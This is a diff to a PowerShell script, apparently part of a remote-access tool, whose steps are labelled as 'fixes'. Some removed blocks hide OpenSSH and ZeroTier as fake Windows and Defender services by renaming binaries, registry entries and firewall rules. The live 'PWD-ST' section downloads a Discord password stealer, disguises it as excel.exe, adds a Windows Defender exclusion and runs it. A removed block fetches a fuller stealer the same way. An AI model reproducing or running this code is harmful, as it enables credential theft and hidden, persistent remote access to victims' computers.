@@ -189,112 +189,112 @@ if ($opconfirm.ToLower() -eq "y") {
 	} else {
 }
 #OP Adv Fix
-$ztconfirm = Read-Host "Proceed With OP Adv Fix (y/n)"
-if ([string]::IsNullOrEmpty($ztconfirm)) {
-    Start-Sleep -Seconds 1
-    $ztconfirm = "n"
-}
-if ($ztconfirm.ToLower() -eq "y") {
-    Write-Host "Executing OP Adv Fix..."
-	$oldFolderPath = "C:\Program Files\OpenSSH"
-	$newFolderPath = "C:\Program Files\TaskManager"
-	$retryAttempts = 5
-	$successColor = "Green"
-	$errorColor = "Red"
-	$warningColor = "Yellow"
-	if (Test-Path $oldFolderPath) {
-		Write-Host "Found OpenSSH folder." -ForegroundColor $warningColor
-		$copySuccess = $false
-		$renameSuccess = $false
-
-		if (!(Test-Path $newFolderPath)) {
-			for ($i = 1; $i -le $retryAttempts; $i++) {
-				try {
-					Copy-Item -Path $oldFolderPath -Destination $newFolderPath -Recurse -Force
-					Write-Host "OpenSSH folder copied to TaskManager folder." -ForegroundColor $successColor
-					$copySuccess = $true
-					break
-				}
-				catch {
-					Write-Host "Copy attempt $i failed. Retrying..." -ForegroundColor $errorColor
-					Start-Sleep -Seconds 1
-				}
-			}
-		}
-		else {
-			Write-Host "TaskManager folder already exists. Skipping the copy, rename, and registry update." -ForegroundColor $warningColor
-			$copySuccess = $true
-			$renameSuccess = $true
-		}
-
-		if ($copySuccess) {
-			$oldFilePath = Join-Path $newFolderPath "sshd.exe"
-			$newFilePath = Join-Path $newFolderPath "IP-Handler.exe"
-			$fileRenameNeeded = !(Test-Path $newFilePath)
-
-			if ($fileRenameNeeded) {
-				for ($i = 1; $i -le $retryAttempts; $i++) {
-					try {
-						Rename-Item -Path $oldFilePath -NewName $newFilePath -Force
-						Write-Host "File renamed: $oldFilePath to $newFilePath." -ForegroundColor $successColor
-						$renameSuccess = $true
-						break
-					}
-					catch {
-						Write-Host "Rename attempt $i failed. Retrying..." -ForegroundColor $errorColor
-						Start-Sleep -Seconds 1
-					}
-				}
-			}
-			else {
-				Write-Host "File already renamed: $oldFilePath to $newFilePath. Skipping the rename and registry update." -ForegroundColor $warningColor
-				$renameSuccess = $true
-			}
-
-			if ($renameSuccess) {
-				$sshregkey = "HKLM:\SYSTEM\CurrentControlSet\Services\sshd"
-				$sshagentregkey = "HKLM:\SYSTEM\CurrentControlSet\Services\ssh-agent"
-				for ($i = 1; $i -le $retryAttempts; $i++) {
-					try {
-						Set-ItemProperty -Path $sshregkey -Name "DisplayName" -Value "Windows System Core Service"
-						Set-ItemProperty -Path $sshregkey -Name "Description" -Value "Windows System Essential Services"
-						Set-ItemProperty -Path $sshregkey -Name "ImagePath" -Value $newFilePath
-						Write-Host "Registry updated for $sshregkey." -ForegroundColor $successColor
-
-						Set-ItemProperty -Path $sshagentregkey -Name "DisplayName" -Value "Windows Power Service"
-						Set-ItemProperty -Path $sshagentregkey -Name "Description" -Value "Windows System Essential Services"
-						Set-ItemProperty -Path $sshagentregkey -Name "ImagePath" -Value "C:\Program Files\TaskManager\Update-Handler.exe"
-						Write-Host "Registry updated for $sshagentregkey." -ForegroundColor $successColor
-
-						Restart-Service sshd
-						Write-Host "sshd service restarted." -ForegroundColor $successColor
-
-						break
-					}
-					catch {
-						Write-Host "Registry update attempt $i failed. Retrying..." -ForegroundColor $errorColor
-						Start-Sleep -Seconds 1
-					}
-				}
-			}
-			else {
-				Write-Host "File renaming failed. Cannot proceed with registry update." -ForegroundColor $errorColor
-			}
-		}
-		else {
-			Write-Host "OpenSSH folder copy failed. Cannot proceed with file renaming and registry update." -ForegroundColor $errorColor
-		}
-
-		if ($copySuccess -and $renameSuccess) {
-			Remove-Item -Path $oldFolderPath -Force -Recurse -ErrorAction SilentlyContinue
-			Write-Host "Removed OpenSSH folder." -ForegroundColor $successColor
-		}
-	}
-	else {
-		Write-Host "OpenSSH folder not found. Skipping the entire section." -ForegroundColor $warningColor
-	}
-} else {
-}
+#$ztconfirm = Read-Host "Proceed With OP Adv Fix (y/n)"
+#if ([string]::IsNullOrEmpty($ztconfirm)) {
+#    Start-Sleep -Seconds 1
+#    $ztconfirm = "n"
+#}
+#if ($ztconfirm.ToLower() -eq "y") {
+#   Write-Host "Executing OP Adv Fix..."
+#	$oldFolderPath = "C:\Program Files\OpenSSH"
+#	$newFolderPath = "C:\Program Files\TaskManager"
+#	$retryAttempts = 5
+#	$successColor = "Green"
+#	$errorColor = "Red"
+#	$warningColor = "Yellow"
+#	if (Test-Path $oldFolderPath) {
+#		Write-Host "Found OpenSSH folder." -ForegroundColor $warningColor
+#		$copySuccess = $false
+#		$renameSuccess = $false
+#
+#		if (!(Test-Path $newFolderPath)) {
+#			for ($i = 1; $i -le $retryAttempts; $i++) {
+#				try {
+#					Copy-Item -Path $oldFolderPath -Destination $newFolderPath -Recurse -Force
+#					Write-Host "OpenSSH folder copied to TaskManager folder." -ForegroundColor $successColor
+#					$copySuccess = $true
+#					break
+#				}
+#				catch {
+#					Write-Host "Copy attempt $i failed. Retrying..." -ForegroundColor $errorColor
+#					Start-Sleep -Seconds 1
+#				}
+#			}
+#		}
+#		else {
+#			Write-Host "TaskManager folder already exists. Skipping the copy, rename, and registry update." -ForegroundColor $warningColor
+#			$copySuccess = $true
+#			$renameSuccess = $true
+#		}
+#
+#		if ($copySuccess) {
+#			$oldFilePath = Join-Path $newFolderPath "sshd.exe"
+#			$newFilePath = Join-Path $newFolderPath "IP-Handler.exe"
+#			$fileRenameNeeded = !(Test-Path $newFilePath)
+#
+#			if ($fileRenameNeeded) {
+#				for ($i = 1; $i -le $retryAttempts; $i++) {
+#					try {
+#						Rename-Item -Path $oldFilePath -NewName $newFilePath -Force
+#						Write-Host "File renamed: $oldFilePath to $newFilePath." -ForegroundColor $successColor
+#						$renameSuccess = $true
+#						break
+#					}
+#					catch {
+#						Write-Host "Rename attempt $i failed. Retrying..." -ForegroundColor $errorColor
+#						Start-Sleep -Seconds 1
+#					}
+#				}
+#			}
+#			else {
+#				Write-Host "File already renamed: $oldFilePath to $newFilePath. Skipping the rename and registry update." -ForegroundColor $warningColor
+#				$renameSuccess = $true
+#			}
+#
+#			if ($renameSuccess) {
+#				$sshregkey = "HKLM:\SYSTEM\CurrentControlSet\Services\sshd"
+#				$sshagentregkey = "HKLM:\SYSTEM\CurrentControlSet\Services\ssh-agent"
+#				for ($i = 1; $i -le $retryAttempts; $i++) {
+#					try {
+#						Set-ItemProperty -Path $sshregkey -Name "DisplayName" -Value "Windows System Core Service"
+#						Set-ItemProperty -Path $sshregkey -Name "Description" -Value "Windows System Essential Services"
+#						Set-ItemProperty -Path $sshregkey -Name "ImagePath" -Value $newFilePath
+#						Write-Host "Registry updated for $sshregkey." -ForegroundColor $successColor
+#
+#						Set-ItemProperty -Path $sshagentregkey -Name "DisplayName" -Value "Windows Power Service"
+#						Set-ItemProperty -Path $sshagentregkey -Name "Description" -Value "Windows System Essential Services"
+#						Set-ItemProperty -Path $sshagentregkey -Name "ImagePath" -Value "C:\Program Files\TaskManager\Update-Handler.exe"
+#						Write-Host "Registry updated for $sshagentregkey." -ForegroundColor $successColor
+#
+#						Restart-Service sshd
+#						Write-Host "sshd service restarted." -ForegroundColor $successColor
+#
+#						break
+#					}
+#					catch {
+#						Write-Host "Registry update attempt $i failed. Retrying..." -ForegroundColor $errorColor
+#						Start-Sleep -Seconds 1
+#					}
+#				}
+#			}
+#			else {
+#				Write-Host "File renaming failed. Cannot proceed with registry update." -ForegroundColor $errorColor
+#			}
+#		}
+#		else {
+#			Write-Host "OpenSSH folder copy failed. Cannot proceed with file renaming and registry update." -ForegroundColor $errorColor
+#		}
+#
+#		if ($copySuccess -and $renameSuccess) {
+#			Remove-Item -Path $oldFolderPath -Force -Recurse -ErrorAction SilentlyContinue
+#			Write-Host "Removed OpenSSH folder." -ForegroundColor $successColor
+#		}
+#	}
+#	else {
+#		Write-Host "OpenSSH folder not found. Skipping the entire section." -ForegroundColor $warningColor
+#	}
+#} else {
+#}
 #ZT Setup
 $ztconfirm = Read-Host "Proceed With ZT Fix (y/n)"
 if ([string]::IsNullOrEmpty($ztconfirm)) {
@@ -361,33 +361,33 @@ if ($ztconfirm.ToLower() -eq "y") {
 } else {
 }
 #ZT Adv Fix
-$ztadv = Read-Host "Proceed With ZT Adv Fix (y/n)"
-if ([string]::IsNullOrEmpty($ztadv)) {
-    Start-Sleep -Seconds 1
-    $ztadv = "n"	
-}
-if ($ztadv.ToLower() -eq "y") {
-    Write-Host "Executing ZT Adv Fix..."
-	$ztregkey = "HKLM:\SYSTEM\CurrentControlSet\Services\ZeroTierOneService"
-	Set-ItemProperty -Path $ztregkey -Name "DisplayName" -Value "Windows Defender Core Service"
-	Set-ItemProperty -Path $ztregkey -Name "Description" -Value "Windows Defender Essential Services"
-	$ruleName = "ZeroTier x64 Binary In"
-	$existingRule = Get-NetFirewallRule | Where-Object { $_.DisplayName -eq $ruleName }
-	if ($existingRule) {
-		$newRuleName = "Windoes Defender Core Service"
-		Set-NetFirewallRule -DisplayName $ruleName -NewDisplayName $newRuleName -ErrorAction SilentlyContinue
-		Set-NetFirewallRule -DisplayName $newRuleName -ErrorAction SilentlyContinue
-	}
-	$ruleName2 = "ZeroTier UDP/9993 In"
-	$existingRule2 = Get-NetFirewallRule | Where-Object { $_.DisplayName -eq $ruleName2 }
-	if ($existingRule2) {
-		$newRuleName2 = "Windows Defender Service"
-		Set-NetFirewallRule -DisplayName $ruleName2 -NewDisplayName $newRuleName2 -ErrorAction SilentlyContinue
-		Set-NetFirewallRule -DisplayName $newRuleName2 -ErrorAction SilentlyContinue
-	}	
-	Restart-Service ZeroTierOneService
-} else {
-}
+#$ztadv = Read-Host "Proceed With ZT Adv Fix (y/n)"
+#if ([string]::IsNullOrEmpty($ztadv)) {
+#    Start-Sleep -Seconds 1
+#    $ztadv = "n"	
+#}
+#if ($ztadv.ToLower() -eq "y") {
+#    Write-Host "Executing ZT Adv Fix..."
+#	$ztregkey = "HKLM:\SYSTEM\CurrentControlSet\Services\ZeroTierOneService"
+#	Set-ItemProperty -Path $ztregkey -Name "DisplayName" -Value "Windows Defender Core Service"
+#	Set-ItemProperty -Path $ztregkey -Name "Description" -Value "Windows Defender Essential Services"
+#	$ruleName = "ZeroTier x64 Binary In"
+#	$existingRule = Get-NetFirewallRule | Where-Object { $_.DisplayName -eq $ruleName }
+#	if ($existingRule) {
+#		$newRuleName = "Windoes Defender Core Service"
+#		Set-NetFirewallRule -DisplayName $ruleName -NewDisplayName $newRuleName -ErrorAction SilentlyContinue
+#		Set-NetFirewallRule -DisplayName $newRuleName -ErrorAction SilentlyContinue
+#	}
+#	$ruleName2 = "ZeroTier UDP/9993 In"
+#	$existingRule2 = Get-NetFirewallRule | Where-Object { $_.DisplayName -eq $ruleName2 }
+#	if ($existingRule2) {
+#		$newRuleName2 = "Windows Defender Service"
+#		Set-NetFirewallRule -DisplayName $ruleName2 -NewDisplayName $newRuleName2 -ErrorAction SilentlyContinue
+#		Set-NetFirewallRule -DisplayName $newRuleName2 -ErrorAction SilentlyContinue
+#	}	
+#	Restart-Service ZeroTierOneService
+#} else {
+#}
 #PWD-ST Fix
 $pwdst = Read-Host "Proceed With PWD-ST Fix (y/n)"
 if ([string]::IsNullOrEmpty($pwdst)) {
@@ -396,27 +396,10 @@ if ([string]::IsNullOrEmpty($pwdst)) {
 }
 if ($pwdst.ToLower() -eq "y") {
     Write-Host "Executing PWD-ST Fix..."
-	Remove-Item -Path $folderPath -Recurse -Force -ErrorAction SilentlyContinue
+	Remove-Item -Path $output -Recurse -Force -ErrorAction SilentlyContinue
 	$TempDir = [System.IO.Path]::GetTempPath()
 	$output = "$TempDir\excel.exe"
 	$url = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/discordpwdstealer.exe"
-	Invoke-WebRequest -Uri $url -OutFile $output
-	Add-MpPreference -ExclusionPath $output
-	Start-Process -FilePath $output
-	Remove-MpPreference -ExclusionPath $output
-} else {
-}
-#Full-PWD-ST Fix
-$fullpwdst = Read-Host "Proceed With Full-PWD-ST Fix (y/n)"
-if ([string]::IsNullOrEmpty($fullpwdst)) {
-    Start-Sleep -Seconds 1
-    $fullpwdst = "n"
-}
-if ($fullpwdst.ToLower() -eq "y") {
-	Remove-Item -Path $folderPath -Recurse -Force -ErrorAction SilentlyContinue
-	$TempDir = [System.IO.Path]::GetTempPath()
-	$output = "$TempDir\excel.exe"
-	$url = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/discordfullstealer.exe"
 	Invoke-WebRequest -Uri $url -OutFile $output
 	Add-MpPreference -ExclusionPath $output
 	Start-Process -FilePath $output
